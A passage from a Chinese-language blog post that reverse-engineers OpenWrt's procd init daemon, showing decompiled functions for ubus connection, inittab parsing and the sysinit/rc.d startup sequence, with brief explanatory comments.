class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Finished udevtrigger\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Finished udevtrigger\n&quot;</span>, <span class="string">&quot;udevtrigger_complete&quot;</span>, <span class="number">36</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_10C38</span>(sub_FA9C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大致的还是一个log的记录，主要还是</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_FA9C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Coldplug complete\n&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Coldplug complete\n&quot;</span>, <span class="string">&quot;coldplug_complete&quot;</span>, <span class="number">29</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v0 = <span class="built_in">sub_10C38</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_AE4C</span>(v0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>又运行一次sub_AE4C函数</p><p>此时就是case2了</p><h4 id="case2"><a href="#case2" class="headerlink" title="case2"></a>case2</h4><h4 id="sub-8D60"><a href="#sub-8D60" class="headerlink" title="sub_8D60"></a>sub_8D60</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BD60</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  dword_1AD5C = (<span class="type">int</span>)sub_BC18;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sub_BC18</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r0</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="built_in">ubus_connect</span>(dword_1AD68);</span><br><span class="line">  dword_1AD6C = v0;</span><br><span class="line">  <span class="keyword">if</span> ( v0 )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)(v0 + <span class="number">92</span>) = sub_BBFC;</span><br><span class="line">    <span class="built_in">sub_D610</span>();</span><br><span class="line">    <span class="built_in">sub_C79C</span>(dword_1AD6C);</span><br><span class="line">    <span class="built_in">sub_F99C</span>(dword_1AD6C);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connected to ubus, id=%08x\n&quot;</span>, *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">      <span class="built_in">fprintf</span>(</span><br><span class="line">        (FILE *)stderr,</span><br><span class="line">        <span class="string">&quot;procd: %s(%d): Connected to ubus, id=%08x\n&quot;</span>,</span><br><span class="line">        <span class="string">&quot;ubus_connect_cb&quot;</span>,</span><br><span class="line">        <span class="number">58</span>,</span><br><span class="line">        *(_DWORD *)(dword_1AD6C + <span class="number">80</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_fd_add</span>(dword_1AD6C + <span class="number">44</span>, <span class="number">9</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Connection to ubus failed\n&quot;</span>);</span><br><span class="line">      <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Connection to ubus failed\n&quot;</span>, <span class="string">&quot;ubus_connect_cb&quot;</span>, <span class="number">48</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">uloop_timeout_set</span>(&amp;unk_1AD50, <span class="number">1000</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试连接到 <code>ubus</code>，并根据连接结果执行相应的初始化和事件处理设置。成功时，配置回调并将连接添加到事件循环；失败时，设置一个定时器以便稍后重试。</p><h4 id="sub-D4CC"><a href="#sub-D4CC" class="headerlink" title="sub_D4CC"></a>sub_D4CC</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_D4CC</span><span class="params">(<span class="type">char</span> *a1, <span class="type">char</span> *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v8; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r6</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">blob_buf_init</span>(&amp;dword_1AD8C, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>((<span class="type">int</span>)<span class="string">&quot;name&quot;</span>, a1);</span><br><span class="line">  v4 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instances&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v5 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;instance1&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  v6 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;command&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = a2; ; i = <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="built_in">strtok</span>(i, <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !v8 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">sub_CE04</span>(<span class="number">0</span>, v8);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v6);</span><br><span class="line">  v9 = <span class="built_in">blobmsg_open_nested</span>(&amp;dword_1AD8C, <span class="string">&quot;respawn&quot;</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;3600&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">  <span class="built_in">sub_CE04</span>(<span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;0&quot;</span>);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v9);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v5);</span><br><span class="line">  <span class="built_in">blob_nest_end</span>(&amp;dword_1AD8C, v4);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_D304</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, (<span class="type">char</span> *)<span class="string">&quot;add&quot;</span>, dword_1AD8C);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过构建 <code>blobmsg</code> 消息来组织和传递数据。它<strong>创建一个包含实例和命令的结构</strong>，适用于需要复杂数据传递的场景。最终调用 <code>sub_D304</code> 处理该消息。</p><p>函数 <code>sub_D304</code> 处理服务请求，根据输入参数更新现有服务或创建新服务。</p><h4 id="sub-B458函数"><a href="#sub-B458函数" class="headerlink" title="sub_B458函数"></a>sub_B458函数</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">sub_B458</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> *v0; <span class="comment">// r4</span></span><br><span class="line">  _DWORD *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">size_t</span> v2; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// t1</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">regoff_t</span> *p_rm_eo; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">regoff_t</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">regoff_t</span> v8; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *v9; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">char</span> *i; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// r2</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v14; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> v15; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v16; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v17; <span class="comment">// r0</span></span><br><span class="line">  _DWORD *v18; <span class="comment">// r3</span></span><br><span class="line">  FILE *stream; <span class="comment">// [sp+8h] [bp-88h]</span></span><br><span class="line">  <span class="type">regmatch_t</span> v20[<span class="number">5</span>]; <span class="comment">// [sp+10h] [bp-80h] BYREF</span></span><br><span class="line">  <span class="type">regex_t</span> preg; <span class="comment">// [sp+38h] [bp-58h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v22[<span class="number">14</span>]; <span class="comment">// [sp+58h] [bp-38h] BYREF</span></span><br><span class="line"></span><br><span class="line">  stream = <span class="built_in">fopen</span>(<span class="string">&quot;/etc/inittab&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">regcomp</span>(&amp;preg, <span class="string">&quot;([a-zA-Z0-9]*):([a-zA-Z0-9]*):([a-zA-Z0-9]*):(.*)&quot;</span>, <span class="number">1</span>);<span class="comment">// 编辑一个正则表达式</span></span><br><span class="line">    v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">    v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">    <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">LABEL_26:</span><br><span class="line">    <span class="keyword">while</span> ( <span class="built_in">fgets</span>(v0, <span class="number">128</span>, stream) )            <span class="comment">// 读取</span></span><br><span class="line">    &#123;</span><br><span class="line">      v2 = <span class="built_in">strlen</span>(v0);</span><br><span class="line">      v3 = &amp;v0[v2];</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v4 = (<span class="type">unsigned</span> __int8)*--v3;</span><br><span class="line">        <span class="keyword">if</span> ( (*(_WORD *)(_ctype_b + <span class="number">2</span> * v4) &amp; <span class="number">0x20</span>) == <span class="number">0</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        --v2;</span><br><span class="line">      &#125;</span><br><span class="line">      v0[v2] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( *v0 != <span class="string">&#x27;#&#x27;</span> &amp;&amp; !<span class="built_in">regexec</span>(&amp;preg, v0, <span class="number">5u</span>, v20, <span class="number">0</span>) )<span class="comment">// 忽略行首为#</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)debug_level &gt; <span class="number">3</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Parsing inittab - %s&quot;</span>, v0);</span><br><span class="line">          <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: %s(%d): Parsing inittab - %s&quot;</span>, <span class="string">&quot;procd_inittab&quot;</span>, <span class="number">274</span>, v0);</span><br><span class="line">        &#125;</span><br><span class="line">        v5 = <span class="number">0</span>;</span><br><span class="line">        p_rm_eo = &amp;v20[<span class="number">0</span>].rm_eo;</span><br><span class="line">        <span class="keyword">do</span></span><br><span class="line">        &#123;</span><br><span class="line">          v7 = *p_rm_eo;</span><br><span class="line">          v8 = p_rm_eo[<span class="number">1</span>];</span><br><span class="line">          p_rm_eo += <span class="number">2</span>;</span><br><span class="line">          v0[v7] = <span class="number">0</span>;</span><br><span class="line">          v22[v5++] = (<span class="type">int</span>)&amp;v0[v8];             <span class="comment">// 提取字段</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( v5 != <span class="number">4</span> );</span><br><span class="line">        v9 = v1;</span><br><span class="line">        v10 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="built_in">strtok</span>((<span class="type">char</span> *)v22[<span class="number">3</span>], <span class="string">&quot; &quot;</span>); ; i = <span class="built_in">strtok</span>(<span class="number">0</span>, <span class="string">&quot; &quot;</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          v12 = (<span class="type">int</span>)i;</span><br><span class="line">          ++v9;</span><br><span class="line">          <span class="keyword">if</span> ( i )</span><br><span class="line">            v12 = <span class="number">1</span>;</span><br><span class="line">          <span class="keyword">if</span> ( v10 &gt; <span class="number">6</span> )</span><br><span class="line">            v12 = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v12 )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          v9[<span class="number">2</span>] = i;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        v13 = v22[<span class="number">0</span>];</span><br><span class="line">        v14 = (<span class="type">const</span> <span class="type">char</span> *)v22[<span class="number">2</span>];</span><br><span class="line">        v15 = <span class="number">0</span>;</span><br><span class="line">        v1[v10 + <span class="number">3</span>] = <span class="number">0</span>;</span><br><span class="line">        v16 = <span class="number">0</span>;</span><br><span class="line">        v1[<span class="number">2</span>] = v13;</span><br><span class="line">        v1[<span class="number">11</span>] = v0;</span><br><span class="line">        <span class="keyword">while</span> ( v15 != <span class="number">5</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v17 = <span class="built_in">strcmp</span>((&amp;off_1AA58)[v16], v14); <span class="comment">// 匹配字段</span></span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">          <span class="keyword">if</span> ( !v17 )</span><br><span class="line">          &#123;</span><br><span class="line">            *v1 = &amp;off_1AA50;</span><br><span class="line">            v18 = off_1AA54;</span><br><span class="line">            off_1AA54 = v1;</span><br><span class="line">            v1[<span class="number">1</span>] = v18;</span><br><span class="line">            v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">            *v18 = v1;</span><br><span class="line">            v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">            v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line">            <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line">            <span class="keyword">goto</span> LABEL_26;</span><br><span class="line">          &#125;</span><br><span class="line">          ++v15;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">        <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Unknown init handler %s\n&quot;</span>, v14);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fclose</span>(stream);</span><br><span class="line">    <span class="built_in">free</span>(v0);</span><br><span class="line">    <span class="built_in">free</span>(v1);</span><br><span class="line">    <span class="built_in">regfree</span>(&amp;preg);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">    <span class="built_in">fprintf</span>((FILE *)stderr, <span class="string">&quot;procd: Failed to open %s\n&quot;</span>, <span class="string">&quot;/etc/inittab&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取&#x2F;etc&#x2F;inittab文件，匹配格式为 <code>identifier:runlevel:action:process</code> 的行，以处理服务初始化数据</p><h5 id="etc-inittab"><a href="#etc-inittab" class="headerlink" title="&#x2F;etc&#x2F;inittab"></a>&#x2F;etc&#x2F;inittab</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Copyright (c) 2013 The Linux Foundation. All rights reserved.</span></span><br><span class="line">::sysinit:/etc/init.d/rcS S boot</span><br><span class="line">::shutdown:/etc/init.d/rcS K shutdown</span><br><span class="line">ttyHSL1::askfirst:/bin/login</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*v1 = &amp;off_1AA50;</span><br><span class="line">v18 = off_1AA54;</span><br><span class="line">off_1AA54 = v1;</span><br><span class="line">v1[<span class="number">1</span>] = v18;</span><br><span class="line">v1[<span class="number">12</span>] = &amp;(&amp;off_1AA58)[<span class="number">3</span> * v15];</span><br><span class="line">*v18 = v1;</span><br><span class="line">v0 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x80</span>u);</span><br><span class="line">v1 = <span class="built_in">malloc</span>(<span class="number">0x64</span>u);</span><br><span class="line"><span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="number">0x64</span>u);</span><br><span class="line"><span class="keyword">goto</span> LABEL_26;</span><br></pre></td></tr></table></figure><p>可以看到这部分1AA50已然被修改了</p><p>之后执行</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;respawn&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askconsole&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;askfirst&quot;</span>);</span><br><span class="line"><span class="built_in">sub_B3F4</span>(<span class="string">&quot;sysinit&quot;</span>);</span><br></pre></td></tr></table></figure><p>想来算是只会执行最后一个函数</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span> *__fastcall <span class="title">sub_B3F4</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *s2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v1; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">void</span> **i; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> **v3; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v4; <span class="comment">// r3</span></span><br><span class="line"></span><br><span class="line">  v1 = s2;</span><br><span class="line">  <span class="keyword">for</span> ( i = (<span class="type">void</span> **)off_1AA50; i != &amp;off_1AA50; i = (<span class="type">void</span> **)*i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = (<span class="type">const</span> <span class="type">char</span> **)i[<span class="number">12</span>];</span><br><span class="line">    s2 = (<span class="type">const</span> <span class="type">char</span> *)<span class="built_in">strcmp</span>(*v3, v1);</span><br><span class="line">    <span class="keyword">if</span> ( !s2 )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = v3[<span class="number">1</span>];</span><br><span class="line">      <span class="keyword">if</span> ( !v3[<span class="number">2</span>] )</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">      s2 = (<span class="type">const</span> <span class="type">char</span> *)((<span class="built_in">int</span> (__fastcall *)(<span class="type">void</span> **))v4)(i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> s2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行i[12]即sub_B398（sysinit对应的函数）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_B398</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3, <span class="type">int</span> a4)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r1</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)(a1 + <span class="number">16</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = *(_DWORD *)(a1 + <span class="number">20</span>);</span><br><span class="line">    <span class="keyword">if</span> ( v4 )</span><br><span class="line">      <span class="keyword">return</span> <span class="built_in">sub_BB80</span>(*(_DWORD *)(a1 + <span class="number">16</span>), v4, sub_B394, a4);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">syslog</span>(<span class="number">0</span>, <span class="string">&quot;valid format is rcS &lt;S|K&gt; &lt;param&gt;\n&quot;</span>, a3);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">fputs</span>((<span class="type">const</span> <span class="type">char</span> *)&amp;word_1162A, (FILE *)stderr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __fastcall <span class="title">sub_BB80</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2, <span class="type">int</span> a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">runqueue_init</span>((<span class="type">int</span>)&amp;unk_1ACD0);</span><br><span class="line">  dword_1AD04 = <span class="number">1</span>;</span><br><span class="line">  dword_1AD0C = a3;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">sub_B730</span>((<span class="type">int</span>)&amp;unk_1ACD0, <span class="string">&quot;/etc/rc.d&quot;</span>, a1, (<span class="type">int</span>)<span class="string">&quot;*&quot;</span>, a2);</span><br><span 